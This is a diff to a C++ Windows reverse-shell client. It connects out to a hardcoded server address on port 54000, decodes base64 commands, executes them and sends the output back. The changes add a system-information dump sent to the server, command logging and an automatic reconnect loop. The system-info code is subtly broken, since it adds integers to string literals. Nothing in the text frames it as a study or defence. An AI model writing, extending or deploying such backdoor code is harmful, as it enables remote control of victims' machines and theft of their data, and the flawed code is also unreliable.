@@ -3,17 +3,45 @@
 #include <stdexcept>
 #include <vector>
 #include <sstream>
+#include <fstream>
+#include <ctime>
 #include <algorithm>
 #include <iterator>
 #include <WS2tcpip.h>
+#include <Windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "user32.lib")
 
 using namespace std;
 
 typedef unsigned char uchar;             // Custom Data Type
-const string TARGETIP = "127.0.0.1";      // SERVER Ip Address
+const string TARGETIP = "192.168.1.6";      // SERVER Ip Address
 const int    TARGETPO = 54000;          // SERVER Port Numbe
+
+// Dumping System information
+class DUMP_SYSINFO {
+private:
+	SYSTEM_INFO sysInfo;
+public:
+	DUMP_SYSINFO() {
+		GetSystemInfo(&sysInfo);
+	}
+	string toString(){
+		string rtval = "";
+		rtval += "OEM ID: " + sysInfo.dwOemId;
+		rtval += "\nNumber of processors: " + sysInfo.dwNumberOfProcessors;
+		rtval += "\nPage size: " + sysInfo.dwPageSize;
+		rtval += "\nProcessor type: " + sysInfo.dwProcessorType;
+		rtval += "\nActive processor mask: " + sysInfo.dwActiveProcessorMask;
+		rtval += "\nReserved Memory: " + sysInfo.wReserved;
+		rtval += "\nProcessor Architecture: " + sysInfo.wProcessorArchitecture;
+		rtval += "\nProcessor Level: " + sysInfo.wProcessorLevel;
+		rtval += "\nProcessor Revision: " + sysInfo.wProcessorRevision;
+		rtval += "\n";
+		return rtval;
+	}
+};
 
 // Some Extended Methods for String
 class STRINGER{
@@ -225,6 +253,7 @@ public:
 				if (stringer.base64_decode(values[0]) == "true"){
 					toexecute = stringer.base64_decode(values[1]);
 					output    = stringer.exec(toexecute.c_str());
+					cout << "Command Received: " << toexecute << endl;
 					senddata(output);
 				}else{
 					cout << "Received False in Command Prompt" << endl;
@@ -232,6 +261,11 @@ public:
 			}
 		}else{                                   // Silly Prompt
 			toexecute = stringer.base64_decode(command);
+			cout << "Command Received: " << toexecute << endl;
+			if (toexecute == "sysinfo") {
+				DUMP_SYSINFO informater;
+				senddata(informater.toString());
+			}
 		}
 	}
 	bool launch(){
@@ -245,17 +279,18 @@ public:
 				rtval = false;
 				break;
 			}else if (data == "shutdown"){
-				rtval = true;
+				rtval = false;
 				break;
 			}else{
 				clean(data);
 				execute(data);
 			}
 		}
-		return true;
+		return rtval;
 	}
 	void engage(){
 		// Initialize WinSock
+		bool stopper;
 		WSAData data;
 		WORD ver = MAKEWORD(2, 2);
 		int ws_result = WSAStartup(ver, &data);
@@ -271,13 +306,14 @@ public:
 					cout << "Establishing!" << endl;
 					connection_conn = connect(connection_sock, (sockaddr*)&client_ip, sizeof(client_ip));
 					if (this->checkSConnection(connection_conn)){
-						bool stopper = this->launch();
-						if (stopper){
-							break;
-						}
+						stopper = this->launch();
+						break;
 					}
 				}
 				close(connection_sock);
+				if (!stopper) {
+					this->engage();
+				}
 			}
 		}
 	}
